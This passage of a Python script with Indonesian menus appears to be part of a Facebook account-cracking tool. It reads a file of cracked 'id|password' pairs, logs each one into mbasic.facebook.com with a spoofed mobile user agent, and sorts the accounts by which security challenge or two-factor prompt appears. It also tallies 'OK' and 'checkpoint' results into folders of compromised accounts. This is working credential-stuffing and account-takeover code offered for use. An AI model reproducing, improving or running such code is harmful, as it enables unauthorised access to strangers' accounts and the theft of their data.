        self.loop+=1;print(f'[bold white]      Proses [bold green]{UserID}: [bold white]{self.loop}/{len(Dump)} Ok:-[bold green]{self.ok}[bold white] Cp:-[bold red]{self.cp}[bold white]              ', end='\r')
class CekOpsiChekpoint:
    def __init__(self):
        Console(width=70,style="bold white").print(panel(f"[bold white]Masukan Lokasi File Hasil Chekpoint",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
        Path = input(f"   └─> ")
        try:File = open(Path,'r').read().splitlines()
        except (FileNotFoundError):print(f"   └─> [bold red]Gagal Menemukan File !!");exit()
        for Data in File:
            idf,pw = Data.split('|')[0],Data.split('|')[1]
            ChekOpsi(idf,pw)
def ChekOpsi(idf,pw):
    with requests.Session() as r:
        try:
            r.headers.update({
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'sec-ch-ua-mobile': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': UserAgentRealme(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            })
            response = bs(r.get('https://mbasic.facebook.com/login').content,'html.parser')
            form = response.find('form',{'method':'post'})
            Data = {}
            inp = form.find_all('input')
            for x in inp:
                if x.get('name') in ["lsd","jazoest","m_ts","li","try_number","bi_xrwh","unrecognized_tries","login","_fb_noscript"]:
                    Data.update({x.get('name'):x.get('value')})
            Data.update({
                'email':idf,
                'pass':pw});response2 = bs(r.post('https://mbasic.facebook.com'+form["action"],data=Data,allow_redirects=False).content,'html.parser')
            Console(style="bold white",width=70).print(panel(f"""{idf} | {pw}""",width=70,subtitle="┌─",subtitle_align='left'),justify="center")
            if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(response2.find('title').text):print('   └─> [bold green]Akun Tap Yes  ')
            if 'Unggah tanda pengenal berfoto' in str(response2.find('title').text):print('   └─> [bold red]Unggah Tanda Pengenal Berfoto  ')
            if 'Dapatkan kode yang dikirim ke ponsel Anda' in str(response2.find('title').text):print('   └─> [bold red]Dapatkan Kode Yang Dikirim Ke Ponsel Anda  ')
            if 'Setujui masuk Anda dari telepon atau komputer lain' in str(response2.find('title').text):print('   └─> [bold red]Setujui Masuk Anda Dari Telepon Atau Komputer Lain  ')
            if 'Minta bantuan kepada teman Facebook Anda' in str(response2.find('title').text):print('   └─> [bold red]Minta Bantuan Kepada Teman Facebook Anda  ')
            if 'Mengidentifikasi komentar terbaru Anda' in str(response2.find('title').text):print('   └─> [bold red]Mengidentifikasi Komentar Terbaru Anda  ')
            else:
                if 'Masukkan Kode Masuk untuk Melanjutkan' in str(response2.find('title').text) or 'Masukan Code' in str(response2.find('title').text) or 'Dua Faktor' in str(response2.find('title').text):print('   └─> [bold red] Akun Terpasang A2F                    ')
                else:print('   └─> [bold green] Akun Tidak Checkpoint                  ')
        except Exception as e:print('   └─> [bold yellow] Kata Sandi Salah Kemungkinan Anda Terkena Spam Ip                  ')
class CekHasil():
    def __init__(self):self.PathFolderOK = 'Results/Ok/';self.PathFolderCP = "Results/Cp/";Console(width=70,style="bold white").print(panel(f"""[bold green][[bold white]01[bold green]][bold blue].[bold white]Cek Hasil Login Sukses         [bold green][[bold white]02[bold green]][bold blue].[bold white]Cek Hasil Login Chekpoint""",width=70,subtitle="┌─",subtitle_align='left'));self.OpsiCek = input("   └─> ");self.Main()
    def Main(self):
        if self.OpsiCek in ("1",'01'):self.CekHasilOK()
        elif self.OpsiCek in ['2',"02"]:self.CekHasilCP()
        else:Console().print(f"   └─> [yellow]Pilihan Tidak Diketahui !");sleep(2);__________________Author__________________()
    def CekHasilOK(self):Tampilkan_File = os.listdir(self.PathFolderOK);Eksekusi = "\n".join([f"[bold green][[white]{Jumlah_File + 1}[green]][bold blue].[white]{Nama_File} ({len(open(self.PathFolderOK+Nama_File,'r').read().splitlines())})" for Jumlah_File,Nama_File in enumerate(Tampilkan_File)]);Console(width=70,style="bold white").print(panel(Eksekusi,width=70,subtitle="┌[green][[blue]Tekan Enter Untuk Kembali[green]]",subtitle_align='left'));input("   └─> ");sleep(2);__________________Author__________________()
    def CekHasilCP(self):Tampilkan_File = os.listdir(self.PathFolderCP);Eksekusi = "\n".join([f"[bold green][[white]{Jumlah_File + 1}[green]][bold blue].[white]{Nama_File} ({len(open(self.PathFolderCP+Nama_File,'r').read().splitlines())})" for Jumlah_File,Nama_File in enumerate(Tampilkan_File)]);Console(width=70,style="bold white").print(panel(Eksekusi,width=70,subtitle="┌[green][[blue]Tekan Enter Untuk Kembali[green]]",subtitle_align='left'));input("   └─> ");sleep(2);__________________Author__________________()
def CreateFolder():
    try:os.mkdir("Data")
    except:pass
    try:os.mkdir("Results")
    except:pass
    try:os.mkdir("Results/Ok")
    except:pass
    try:os.mkdir("Results/Cp")
    except:pass
if __name__ == "__main__":
    os.system('git pull')
    CreateFolder();______Author______();_______Author__________________________();__________________Author__________________()